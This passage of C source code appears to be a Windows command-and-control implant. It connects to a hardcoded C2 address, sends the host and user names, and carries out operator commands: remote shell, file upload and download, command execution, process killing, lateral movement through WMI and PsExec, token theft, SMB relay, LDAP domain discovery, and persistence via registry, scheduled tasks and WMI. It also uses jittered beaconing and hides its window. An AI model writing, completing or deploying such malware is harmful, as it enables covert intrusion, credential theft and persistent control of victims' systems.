        Job *j = JF(ch);
        if (j && j->on && d) { DWORD w; WriteFile(j->hi, d, n, &w, NULL); }
        if (d) HeapFree(GetProcessHeap(), 0, d); return;
    }
    switch (t) {
    case MSG_HEARTBEAT: break;
    case MSG_SHUTDOWN: g_r = 0; break;
    case MSG_SHELL_SPAWN: if (n>=4) { DWORD nc=*(DWORD*)d; Job *j=SP(nc);
        char r[128];const char*m="[Pipe]";
        int l=wsprintfA(r,"OK shell ch=%08X id=%lu %s\r\n",nc,j?j->id:0,m);Tx(CHAN_CTRL,MSG_STATUS,r,l);}break;
    case MSG_SHELL_KILL: if((ch&0xF0000000)==CHAN_SHELL_B){Job*j=JF(ch);if(j)JK(j);} break;
    case MSG_PROC_LIST: PS(); break;
    case MSG_PROC_KILL: if(d&&n)PK((char*)d); break;
    case MSG_FILE_GET: if(d&&n)FileDownload((char*)d); break;
    case MSG_FILE_PUT: case MSG_FILE_CHUNK: if(d&&n)FileUpload(d,n); break;
    case MSG_EXEC: if(d&&n)RunCommand((char*)d); break;
    case MSG_LATERAL: if(d&&n) {
        char *ctx,*copy=_strdup((char*)d),*m=strtok_s(copy,":",&ctx),*a1=strtok_s(NULL,":",&ctx),*a2=strtok_s(NULL,":",&ctx),*a3=strtok_s(NULL,":",&ctx);
        if(m&&a1){if(_stricmp(m,"wmi")==0)LateralWMI(a1,a2?a2:"cmd.exe",a3,NULL);
            else if(_stricmp(m,"psexec")==0)LateralPSExec(a1,a2,a3);
            else if(_stricmp(m,"steal")==0){DWORD pid=(DWORD)atoi(a1);TokenSteal(pid?NULL:a1,pid);}
            else if(_stricmp(m,"smb_start")==0){char*pn=_strdup(a1);CloseHandle(CreateThread(NULL,0,SMBRelayThread,pn,0,NULL));}
            else if(_stricmp(m,"smb_stop")==0){g_smb_running=0;if(g_smb_pipe!=INVALID_HANDLE_VALUE){CloseHandle(g_smb_pipe);g_smb_pipe=INVALID_HANDLE_VALUE;}}}free(copy);
    } break;
    case MSG_DOMAIN: if(d&&n) { if(_stricmp((char*)d,"discover")==0)DomainDiscover();
        else if(strncmp((char*)d,"ldap:",5)==0){char*b=(char*)d+5,*f="(objectClass=*)";char*c=strchr(b,':');if(c){*c=0;f=c+1;}LDAPQuery(b,f);} } break;
    case MSG_PERSIST: if(d&&n) {
        char *ctx,*copy=_strdup((char*)d),*m=strtok_s(copy,":",&ctx),*p=strtok_s(NULL,":",&ctx),*nm=strtok_s(NULL,":",&ctx);
        if(m&&p){if(_stricmp(m,"registry")==0)PersistRegistry(p);else if(_stricmp(m,"schtask")==0)PersistScheduledTask(p,nm);else if(_stricmp(m,"wmi")==0)PersistWMI(p);}free(copy);
    } break;
    case MSG_CONFIG: if(d&&n)RunConfig((char*)d); break;
    }
    if (d) HeapFree(GetProcessHeap(), 0, d);
}

static void JitterSleep(void) {
    DWORD base = g_sleep_ms;
    if (g_jitter_pct > 0 && g_jitter_pct <= 100) {
        int j = (int)(((GetTickCount() * 1103515245 + 12345) & 0x7FFFFFFF) % (base * g_jitter_pct / 50));
        j -= (int)(base * g_jitter_pct / 100);
        base = (DWORD)((int)base + j);
    }
    if (base < 100) base = 100; if (base > 3600000) base = 3600000;
    Sleep(base);
}

DWORD WINAPI AgentMain(LPVOID p) {
    WSADATA w; WSAStartup(MAKEWORD(2,2),&w); InitializeCriticalSection(&g_l);
    g_sk = WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0);
    if(g_sk==INVALID_SOCKET)goto done;
    struct sockaddr_in a; a.sin_family=AF_INET; a.sin_port=htons(C2_PORT); a.sin_addr.s_addr=C2_IP;
    if(connect(g_sk,(struct sockaddr*)&a,sizeof(a))!=0){closesocket(g_sk);g_sk=INVALID_SOCKET;goto done;}
    // TCP keepalive
    {DWORD ka=1;setsockopt(g_sk,SOL_SOCKET,SO_KEEPALIVE,(char*)&ka,sizeof(ka));
        struct tcp_keepalive tk;tk.onoff=1;tk.keepalivetime=30000;tk.keepaliveinterval=5000;
        DWORD r;WSAIoctl(g_sk,SIO_KEEPALIVE_VALS,&tk,sizeof(tk),NULL,0,&r,NULL,NULL);}
    SP(CHAN_SHELL(1));
    {char info[512];WCHAR h[256],u[256];DWORD hl=256,ul=256;GetComputerNameW(h,&hl);GetUserNameW(u,&ul);
        int l=wsprintfA(info,"HOST=%S USER=%S OS=Windows PID=%lu",h,u,GetCurrentProcessId());Tx(CHAN_CTRL,MSG_STATUS,info,l);}
    DWORD lr=0,lastData=GetTickCount();
    while(g_r){struct timeval tv={0,100000};fd_set f;FD_ZERO(&f);FD_SET(g_sk,&f);
        int sel=select(0,&f,NULL,NULL,&tv);
        if(sel>0){DWORD ch;BYTE t;BYTE *d;DWORD n;if(Rx(&ch,&t,&d,&n)==0){Dispatch(ch,t,d,n);lastData=GetTickCount();}else break;}
        if(GetTickCount()-lastData>120000)break;
        if(GetTickCount()-lr>30000){RP();lr=GetTickCount();}
        if(sel==0&&g_sleep_ms>100)JitterSleep();}
done:
    EnterCriticalSection(&g_l);Job*j=g_j;while(j){Job*nx=j->nx;JK(j);j=nx;}LeaveCriticalSection(&g_l);
    if(g_sk!=INVALID_SOCKET)closesocket(g_sk);WSACleanup();DeleteCriticalSection(&g_l);return 0;
}

// EXE entry point
int main(int argc, char *argv[]) {
    // Hide window if running as EXE
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    AgentMain(NULL);

    return 0;
}
